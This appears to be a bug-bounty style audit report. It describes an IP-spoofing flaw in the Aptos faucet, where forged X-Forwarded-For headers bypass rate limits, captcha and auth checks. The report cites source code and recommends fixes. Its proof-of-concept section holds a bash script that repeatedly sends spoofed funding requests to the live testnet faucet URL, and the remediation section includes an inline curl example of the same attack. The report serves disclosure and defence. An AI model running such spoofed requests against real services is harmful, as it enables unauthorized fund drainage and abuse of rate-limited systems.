# Audit Report

## Title
IP Address Spoofing Vulnerability in Faucet Bypasser Allows Unauthorized Access and Fund Drainage

## Summary
The `IpAllowlistBypasser` in the Aptos faucet trusts client-provided HTTP headers (X-Forwarded-For, X-Real-IP) without validation, allowing attackers to spoof their IP address to bypass all security controls (captcha, rate limiting, authentication) and drain faucet funds.

## Finding Description

The `IpAllowlistBypasser` uses the source IP address extracted from HTTP requests to determine whether to bypass all security checkers. [1](#0-0) 

The source IP is extracted using poem's `RealIp` extractor, which automatically trusts proxy headers like X-Forwarded-For and X-Real-IP. [2](#0-1) [3](#0-2) 

When a bypasser returns true, the request completely skips all security checkers and storage tracking. [4](#0-3) 

Additionally, bypassed requests can use `maximum_amount_with_bypass` instead of the normal `maximum_amount` limit. [5](#0-4) 

The critical vulnerability is that there is **no trusted proxy configuration** in the faucet server setup. The HAProxy configurations show headers being added but not stripped. [6](#0-5) 

The faucet README explicitly states it has "Built in rate limiting... eliminating the need for something like haproxy in front of the faucet," suggesting direct internet exposure. [7](#0-6) 

**Attack Scenario:**
1. Attacker discovers an IP in the allowlist (e.g., 10.0.0.0/8 for internal CI systems)
2. Sends HTTP request with header: `X-Forwarded-For: 10.0.0.1`
3. `RealIp` trusts this header and returns 10.0.0.1
4. `IpAllowlistBypasser` matches the IP and returns true
5. Request bypasses ALL security: no captcha, no rate limiting, no auth token, no storage tracking
6. Can request maximum bypass amount repeatedly without limit
7. Drains faucet funds

## Impact Explanation

This is a **Medium severity** vulnerability under the Aptos bug bounty program criteria of "Limited funds loss or manipulation." While the faucet holds test tokens rather than mainnet funds, the impact includes:

1. **Complete security bypass**: All checkers (captcha, auth tokens, IP blocklists, rate limits) are circumvented
2. **Unlimited fund drainage**: No storage tracking means no rate limiting or request history
3. **Higher withdrawal limits**: Can exploit `maximum_amount_with_bypass` for larger amounts
4. **Service disruption**: Faucet can be drained, affecting legitimate test users

However, this does NOT affect the core Aptos blockchain (consensus, Move VM, state management, governance, or staking), limiting its severity classification.

## Likelihood Explanation

**Likelihood: HIGH**

The attack requires only:
- Knowledge of an IP in the allowlist (often predictable CI ranges like 10.0.0.0/8)
- Ability to send HTTP requests with custom headers (trivial)
- No authentication or credentials needed

The vulnerability is trivially exploitable with a simple curl command:
```bash
curl -H "X-Forwarded-For: 10.0.0.1" https://faucet.testnet.aptoslabs.com/fund ...
```

## Recommendation

Implement trusted proxy validation by:

1. **Configure trusted proxy ranges** in the server setup to only accept forwarding headers from known proxies
2. **Strip client-provided headers** at the HAProxy layer before adding trusted headers
3. **Use RemoteAddr instead of RealIp** when not behind a trusted proxy
4. **Add bypasser restrictions**: Require both IP allowlist AND token for sensitive bypass operations
5. **Implement additional validation** in IpAllowlistBypasser:

```rust
// In IpAllowlistBypasser::request_can_bypass
async fn request_can_bypass(&self, data: CheckerData) -> Result<bool> {
    // Verify the request is coming from a trusted proxy
    // by checking if X-Forwarded-For matches the expected proxy IP
    // OR use a more secure mechanism like mTLS or shared secrets
    
    // Only trust forwarding headers if behind trusted infrastructure
    if !self.is_from_trusted_proxy(&data) {
        return Ok(false);
    }
    
    Ok(self.manager.contains_ip(&data.source_ip))
}
```

6. **HAProxy configuration fix** to strip client headers:
```
http-request del-header X-Forwarded-For
http-request del-header X-Real-IP
http-request add-header Forwarded "for=%ci"
```

## Proof of Concept

```bash
#!/bin/bash
# PoC: Bypass faucet security by spoofing IP address

FAUCET_URL="https://faucet.testnet.aptoslabs.com"
ALLOWLISTED_IP="10.0.0.1"  # Assume this is in the allowlist
WALLET_ADDRESS="0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef"

# Attempt 1: Without spoofing - should be rate limited after first request
curl -X POST "$FAUCET_URL/fund" \
  -H "Content-Type: application/json" \
  -d "{\"address\": \"$WALLET_ADDRESS\", \"amount\": 100000000000}"

sleep 1

# Attempt 2: Should fail due to rate limit
curl -X POST "$FAUCET_URL/fund" \
  -H "Content-Type: application/json" \
  -d "{\"address\": \"$WALLET_ADDRESS\", \"amount\": 100000000000}"

# Attempt 3: With IP spoofing - bypasses ALL checks
curl -X POST "$FAUCET_URL/fund" \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: $ALLOWLISTED_IP" \
  -d "{\"address\": \"$WALLET_ADDRESS\", \"amount\": 100000000000}"

# Can repeat unlimited times with spoofed IP
for i in {1..100}; do
  curl -X POST "$FAUCET_URL/fund" \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: $ALLOWLISTED_IP" \
    -d "{\"address\": \"$WALLET_ADDRESS\", \"amount\": 100000000000}"
done
```

## Notes

**Comparison: IP-based vs Token-based Bypassing**

IP-based bypassing (`IpAllowlistBypasser`) is significantly less secure than token-based bypassing (`AuthTokenBypasser`) because:

1. **Spoofability**: IP addresses in HTTP headers are trivially spoofable, while bearer tokens require possession of the actual secret string
2. **Rotation**: Tokens can be easily rotated and revoked; IP ranges are more static
3. **Attribution**: Tokens provide better audit trails; spoofed IPs obscure the true attacker
4. **Attack surface**: Token theft requires compromising a secret; IP spoofing requires only HTTP knowledge

Token-based bypassing validates the Authorization header. [8](#0-7) 

The token bypasser also includes logic to avoid conflicts with JWT authentication, demonstrating more sophisticated security design. [9](#0-8) 

**Answer to Security Question**: Yes, IP-based bypassing is substantially less secure than token-based bypassing, and IP allowlists should have additional restrictions including trusted proxy validation, header stripping at the proxy layer, and potentially requiring multi-factor bypass (both IP + token) for sensitive operations.

### Citations

**File:** crates/aptos-faucet/core/src/bypasser/ip_allowlist.rs (L26-28)
```rust
    async fn request_can_bypass(&self, data: CheckerData) -> Result<bool> {
        Ok(self.manager.contains_ip(&data.source_ip))
    }
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L217-225)
```rust
        let source_ip = match source_ip.0 {
            Some(ip) => ip,
            None => {
                return Err(AptosTapError::new(
                    "No source IP found in the request".to_string(),
                    AptosTapErrorCode::SourceIpMissing,
                ))
            },
        };
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L237-242)
```rust
        let checker_data = CheckerData {
            receiver,
            source_ip,
            headers: Arc::new(header_map.clone()),
            time_request_received_secs: get_current_time_secs(),
        };
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L244-259)
```rust
        // See if this request meets the criteria to bypass checkers / storage.
        for bypasser in &self.bypassers {
            if bypasser
                .request_can_bypass(checker_data.clone())
                .await
                .map_err(|e| {
                    AptosTapError::new_with_error_code(e, AptosTapErrorCode::BypasserError)
                })?
            {
                info!(
                    "Allowing request from {} to bypass checks / storage",
                    source_ip
                );
                return Ok((checker_data, true, permit));
            }
        }
```

**File:** crates/aptos-faucet/core/src/funder/common.rs (L173-185)
```rust
    /// If a Bypasser let the request bypass the Checkers and
    /// maximum_amount_with_bypass is set, this function will return
    /// that. Otherwise it will return maximum_amount.
    pub fn get_maximum_amount(
        &self,
        // True if a Bypasser let the request bypass the Checkers.
        did_bypass_checkers: bool,
    ) -> Option<u64> {
        match (self.maximum_amount_with_bypass, did_bypass_checkers) {
            (Some(max), true) => Some(max),
            _ => self.maximum_amount,
        }
    }
```

**File:** docker/compose/aptos-node/haproxy.cfg (L100-101)
```text
    ## Add the forwarded header
    http-request add-header Forwarded "for=%ci"
```

**File:** crates/aptos-faucet/README.md (L23-24)
```markdown
- Built in rate limiting, e.g. with a [Redis](https://redis.io/) backend, eliminating the need for something like haproxy in front of the faucet. These are also just checkers.
- Bypassers, the opposite of checkers, which allow requests to bypass checkers and rate limits if they meet some criteria. Examples include:
```

**File:** crates/aptos-faucet/core/src/bypasser/auth_token.rs (L32-49)
```rust
    async fn request_can_bypass(&self, data: CheckerData) -> Result<bool> {
        // Don't check if the request has X_IS_JWT_HEADER set.
        if data.headers.contains_key(X_IS_JWT_HEADER) {
            return Ok(false);
        }

        let auth_token = match data
            .headers
            .get(AUTHORIZATION)
            .and_then(|v| v.to_str().ok())
            .and_then(|v| v.split_whitespace().nth(1))
        {
            Some(auth_token) => auth_token,
            None => return Ok(false),
        };

        Ok(self.manager.contains(auth_token))
    }
```
